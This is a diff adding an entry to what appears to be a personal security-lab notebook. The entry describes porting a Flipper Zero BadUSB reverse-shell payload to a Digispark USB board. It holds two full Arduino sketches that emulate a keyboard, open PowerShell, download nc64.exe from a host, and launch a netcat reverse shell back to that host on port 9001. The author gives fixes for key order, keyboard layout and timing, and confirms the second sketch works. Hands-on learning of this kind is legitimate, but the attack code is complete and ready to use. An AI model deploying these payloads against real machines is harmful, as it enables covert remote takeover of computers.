@@ -248,3 +248,114 @@ And only the execute mode is captured by virtual machine.
 
 **TODO:**
 - Reverse shell script from BadUSB to Digispark
+
+## 29.9.2023 - continuation
+ 
+*Digispark to real test.*
+
+I started by trying the [digiQuack by CedArctic](https://cedarctic.github.io/digiQuack/) which converts rubber ducky payloads to compatible with Digispark.
+
+Original payload, used with FlipperZero previously, as it was confirmed as working.  
+
+It ended up like this:
+```ino
+#include "DigiKeyboard.h"
+
+void setup() {}
+
+void loop() {
+	DigiKeyboard.sendKeyStroke(0);
+	// Description: BadUSB Reverse Shell
+	DigiKeyboard.delay(500);
+	DigiKeyboard.sendKeyStroke(0, MOD_GUI_LEFT,KEY_R);
+	DigiKeyboard.delay(400);
+	DigiKeyboard.print("powershell");
+	DigiKeyboard.sendKeyStroke(KEY_ENTER);
+	DigiKeyboard.delay(400);
+	DigiKeyboard.print("Invoke-WebRequest -OutFile nc64.exe -Uri http://192.168.66.2/nc64.exe");
+	DigiKeyboard.delay(400);
+	DigiKeyboard.sendKeyStroke(KEY_ENTER);
+	DigiKeyboard.delay(400);
+	DigiKeyboard.sendKeyStroke(0, MOD_GUI_LEFT,KEY_R);
+	DigiKeyboard.delay(400);
+	DigiKeyboard.print("cmd");
+	DigiKeyboard.sendKeyStroke(KEY_ENTER);
+	DigiKeyboard.delay(400);
+	DigiKeyboard.print("start /min nc64.exe 192.168.66.2 9001 -e powershell");
+	DigiKeyboard.delay(400);
+	DigiKeyboard.sendKeyStroke(KEY_ENTER);
+}
+```
+
+Tried it of course as it is, as a test...   
+Ended up with few problems.
+1. Win+R wasn't working
+2. Digispark seems to use US keyboard layout
+	- So when trying to run that in a machine that uses, in my case, Scandinavian layout, there's plenty of "wrong" characters.
+3. Delays work little bit differently, then with BadUSB = Too fast.
+	- Might be due to my(MS) crappy Virtual Machine - Windows 10
+
+**Tackled them:**
+1. A tip from the cheatshee:   
+*DigiKeyboard.sendKeyStroke(KEY_R , MOD_GUI_LEFT);  
+Windows Run window shortcut (WinKey+ R)*
+
+So it seemed the order needs to be "backwards"   
+Changed it, and it worked.
+
+2. Workaround for now, was to change the victim device KB layout to US.
+3. Increased the delay  
+
+Payload:
+```ino
+#include "DigiKeyboard.h"
+
+void setup() {}
+
+void loop() {
+// Description: BadUSB Reverse Shell
+DigiKeyboard.delay(5000);
+DigiKeyboard.sendKeyStroke(0);
+DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);
+DigiKeyboard.delay(1000);
+DigiKeyboard.print("powershell");
+DigiKeyboard.sendKeyStroke(KEY_ENTER);
+DigiKeyboard.delay(1000);
+DigiKeyboard.print("Invoke-WebRequest -OutFile nc64.exe -Uri http://192.168.66.2/nc64.exe");
+DigiKeyboard.sendKeyStroke(KEY_ENTER);
+DigiKeyboard.delay(2000);
+DigiKeyboard.print("exit");
+DigiKeyboard.delay(1000);
+DigiKeyboard.sendKeyStroke(KEY_ENTER);
+DigiKeyboard.delay(1000);
+DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);
+DigiKeyboard.delay(1000);
+DigiKeyboard.print("cmd");
+DigiKeyboard.sendKeyStroke(KEY_ENTER);
+DigiKeyboard.delay(1000);
+DigiKeyboard.print("start /min nc64.exe 192.168.66.2 9001 -e powershell");
+DigiKeyboard.delay(1000);
+DigiKeyboard.sendKeyStroke(KEY_ENTER);
+DigiKeyboard.delay(2000);
+DigiKeyboard.print("exit");
+DigiKeyboard.delay(1000);
+DigiKeyboard.sendKeyStroke(KEY_ENTER);
+exit(0);
+}
+```
+
+Confirmed and working like should.
+
+[Demo coming here]()
+
+**Profit!**
+
+**TODO:**
+Figure out something for the Scandinavian KB layout.
+
+To read, for later:
+https://github.com/digistump/DigistumpArduino/issues/46   
+https://github.com/ArminJo/DigistumpArduino/blob/982824d0f638a0c567a125ae43d4d5632f65e76f/digistump-avr/libraries/DigisparkKeyboard/keylayouts.h#L41   
+https://digistump.com/board/index.php?topic=2289.0   
+https://github.com/ArminJo/DigistumpArduino   
+https://github.com/SpenceKonde/ATTinyCore   
